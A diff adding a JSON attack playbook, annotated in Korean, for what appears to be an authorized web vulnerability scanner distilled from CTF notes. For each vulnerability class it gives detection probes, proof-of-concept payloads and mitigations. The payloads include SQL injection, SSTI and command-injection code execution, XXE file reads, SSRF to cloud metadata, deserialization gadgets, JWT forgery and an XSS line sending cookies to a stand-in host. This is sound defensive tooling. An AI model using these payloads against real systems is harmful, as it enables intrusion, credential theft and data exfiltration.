@@ -1,0 +1,120 @@
+{
+  "version": 1,
+  "note": "카테고리별 공격 플레이북(데이터 주도). ctf-web 스킬(field-notes 등)에서 증류. 인가된 진단 전용 — finding 에 탐지 프로브/PoC/조치를 붙인다. LLM 없이(폐쇄망) 1계층에서 적용, 3계층(LLM)은 이걸 근거로 심화. detect=안전한 탐지 프로브, poc=대표 공격구문, mitigate=조치.",
+  "source": "ctf-skills/ctf-web (field-notes.md, sql-injection.md, server-side*.md, auth-*.md, node-and-prototype.md)",
+
+  "playbook": {
+    "sql-injection": {
+      "detect": "따옴표 ' 삽입 → 구문오류/동작변화면 SQLi. 시간지연 blind: ' OR SLEEP(5)-- ",
+      "poc": "인증우회 ' OR '1'='1'-- | 데이터추출 ' UNION SELECT username,password,3 FROM users-- | 2차 SQLi/트렁케이션/키워드분절(selselectect) 은 WAF 우회",
+      "confirm": "DB 오류 노출, 인증 우회, UNION 결과 반환, 응답시간 차이",
+      "mitigate": "PreparedStatement/파라미터 바인딩(문자열 연결 금지), 최소권한 DB 계정, ORM",
+      "ref": "sql-injection.md"
+    },
+    "nosql-injection": {
+      "detect": "연산자 주입 {\"$ne\":null} / {\"$gt\":\"\"}. MongoDB regex blind, $where JS 평가",
+      "poc": "인증우회 {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} | 데이터추출 {\"$where\":\"this.pw.match(/^a/)\"} 블라인드 오라클",
+      "confirm": "쿼리 결과 변화/인증 우회, $where 시간지연",
+      "mitigate": "입력 타입 강제(문자열만), $-접두 키 차단, 파라미터라이즈드 쿼리",
+      "ref": "server-side-advanced-4.md"
+    },
+    "command-injection": {
+      "detect": "구분자 삽입 ; id | `id` | $(id) | 개행 %0aid",
+      "poc": "; cat /etc/passwd | 공백우회 {cat,/flag} (brace expansion) | cat 차단시 sed -n p flag / awk '{print}' / tac",
+      "confirm": "명령 출력 반환, OOB DNS/HTTP 콜백",
+      "mitigate": "쉘 미사용(exec 인자 배열), 입력 화이트리스트, 메타문자 차단",
+      "ref": "field-notes.md, server-side-exec-2.md"
+    },
+    "code-injection": {
+      "detect": "평가 컨텍스트 확인(eval/assert/템플릿). 산술 페이로드로 실행여부 판별",
+      "poc": "JS eval 우회 row['con'+'structor']['con'+'structor']('return this')() | PHP assert(') || system('id');// | PHP backtick echo`id`;",
+      "confirm": "코드 실행 결과/부수효과",
+      "mitigate": "eval/assert(문자열) 제거, 안전한 대체 API",
+      "ref": "server-side-exec.md"
+    },
+    "ssti": {
+      "detect": "{{7*7}} → 49 면 SSTI. {{7*'7'}}: Jinja2=49, Twig='7777777'로 엔진 구분",
+      "poc": "Jinja2 {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}} | Go {{.ReadFile \"/flag\"}} | Mako ${__import__('os').popen('id').read()} | EJS <%- global.process.mainModule.require('child_process').execSync('id') %>",
+      "confirm": "산술 평가/명령 출력",
+      "mitigate": "사용자 입력을 템플릿 소스로 쓰지 않기(데이터로만 전달), 샌드박스/오토이스케이프",
+      "ref": "server-side.md"
+    },
+    "path-traversal": {
+      "detect": "../../../etc/passwd. 필터시 ....// , ..%2f , %252e%252e%252f (이중인코딩)",
+      "poc": "파일읽기 ../../../../etc/passwd | Windows 8.3 FILEFO~1 우회 | PHP php://filter/convert.base64-encode/resource=config 로 소스 유출",
+      "confirm": "파일 내용 반환(root:x:0:0 등)",
+      "mitigate": "정규화 후 화이트리스트 경로, os.path.join 함정 주의(절대경로 인자), 사용자 입력을 경로에 직접 쓰지 않기",
+      "ref": "field-notes.md, server-side-advanced.md"
+    },
+    "xxe": {
+      "detect": "XML 입력에 DOCTYPE ENTITY 주입",
+      "poc": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r> | OOB: 외부 DTD로 데이터 유출 | DOCX(ZIP+XML) 업로드에 XXE",
+      "confirm": "엔티티 확장으로 파일내용 반환/OOB 요청",
+      "mitigate": "DTD·외부엔티티 비활성(FEATURE_SECURE_PROCESSING), XML 파서 하드닝",
+      "ref": "server-side-2.md"
+    },
+    "xss": {
+      "detect": "<script>alert(1)</script> | <img src=x onerror=alert(1)> | <svg onload=alert(1)>",
+      "poc": "쿠키탈취 <img src=x onerror=\"new Image().src='//e/'+document.cookie\"> | 필터우회 <ScRiPt>, 엔티티 &#60;, hex \\x3c",
+      "confirm": "스크립트 실행(alert/OOB), 반사/저장 확인",
+      "mitigate": "출력 컨텍스트별 인코딩, CSP(nonce), HttpOnly 쿠키",
+      "ref": "client-side.md, client-side-advanced.md"
+    },
+    "ssrf": {
+      "detect": "내부주소 http://127.0.0.1 , http://169.254.169.254/(클라우드 메타데이터) , 우회 2130706433 / 127.1 / [::1]",
+      "poc": "메타데이터 http://169.254.169.254/latest/meta-data/ | parse_url 우회 http://valid@attacker/ , 더블@ http://x@127.0.0.1@allowed/ | DNS 리바인딩 TOCTOU",
+      "confirm": "내부 서비스 응답/OOB 콜백, 메타데이터 반환",
+      "mitigate": "아웃바운드 목적지 화이트리스트, 링크로컬/사설망 차단, 리다이렉트 추적 금지",
+      "ref": "server-side.md, server-side-advanced-2.md"
+    },
+    "deserialization": {
+      "detect": "Java 직렬화 매직 rO0AB(base64)/aced0005 , Python pickle, PHP O:",
+      "poc": "Java ysoserial CommonsCollections1-7 / 블라인드 URLDNS | Python pickle __reduce__ → (os.system,('id',)) | yaml.load/torch.load 도 동일",
+      "confirm": "가젯체인 실행(OOB DNS로 블라인드 확인)",
+      "mitigate": "신뢰불가 데이터 역직렬화 금지, 화이트리스트(ObjectInputFilter), 서명(HMAC)/필드만 전송",
+      "ref": "server-side-deser.md"
+    },
+    "prototype-pollution": {
+      "detect": "JSON에 {\"__proto__\":{\"polluted\":true}} 주입 후 전역 오염 확인",
+      "poc": "권한상승 {\"__proto__\":{\"isAdmin\":true}} | 체인: 오염 → 템플릿/eval 활성 → VM escape this.constructor.constructor('return process')()",
+      "confirm": "Object.prototype 오염(무관 객체에 속성 나타남)",
+      "mitigate": "__proto__/constructor/prototype 키 차단, Object.create(null), Map 사용, 스키마 검증",
+      "ref": "node-and-prototype.md"
+    },
+    "access-control": {
+      "detect": "쿠키/파라미터 변조 role=admin, isAdmin=true | 숨은 엔드포인트 /api/admin, /internal/* | IDOR: 남의 id 로 접근",
+      "poc": "IDOR /api/users/{다른ID} | 강제 브라우징 /admin | Host: 127.0.0.1 우회 | 클라이언트 게이트는 API 직접 호출로 우회",
+      "confirm": "권한 밖 리소스 접근/조작 성공",
+      "mitigate": "서버측 인가(요청마다 소유권 검증), 간접 참조, 기본거부",
+      "ref": "auth-and-access.md"
+    },
+    "hardcoded-secret": {
+      "detect": "JWT: alg=none, RS256→HS256 혼동, 약한 시크릿(flask-unsign/hashcat), 미검증 서명, jku/jwk/kid 주입",
+      "poc": "alg:none 서명제거 | 키혼동: 공개키로 HS256 서명 | 약한 시크릿 flask-unsign --unsign / hashcat -m 16500 | kid 경로traversal ../../dev/null",
+      "confirm": "위조 토큰으로 인증/권한 획득",
+      "mitigate": "서명 검증 강제·alg 고정, 강한 시크릿, 공개키 노출 금지, kid 화이트리스트",
+      "ref": "auth-jwt.md"
+    },
+    "open-redirect": {
+      "detect": "?redirect= / ?next= / ?url= 파라미터에 외부주소",
+      "poc": "//attacker.com | https:attacker.com | http://valid@attacker | %00, \\\\, CRLF 우회 | OAuth 흐름과 체인해 토큰 탈취",
+      "confirm": "외부 도메인으로 302 리다이렉트",
+      "mitigate": "리다이렉트 대상 화이트리스트(상대경로만), 사용자입력 URL 미사용",
+      "ref": "auth-and-access.md"
+    },
+    "info-disclosure": {
+      "detect": "노출 경로 /server-status, /.git/HEAD, /.env, source map .map, /actuator/env",
+      "poc": "/.git/ 덤프로 소스복원(git-dumper) | /server-status 로 활성 URL·세션 수집 | .map 으로 프론트 소스",
+      "confirm": "민감 파일/메타데이터 200 반환",
+      "mitigate": "노출 경로 차단, 프로덕션 디버그/상태 엔드포인트 비활성, 소스맵 제거",
+      "ref": "auth-and-access.md, cves.md"
+    },
+    "missing-anti-automation": {
+      "detect": "check-then-act 로직에 동시요청 50개(레이스), 인증 무제한 시도",
+      "poc": "잔액/쿠폰/등록 레이스: 동시요청으로 변경전 상태 다중 사용 | 크리덴셜 스터핑",
+      "confirm": "레이스로 중복 처리/한도 우회",
+      "mitigate": "원자적 연산/DB 락, 멱등키, 레이트리밋/락아웃",
+      "ref": "server-side-deser.md"
+    }
+  }
+}
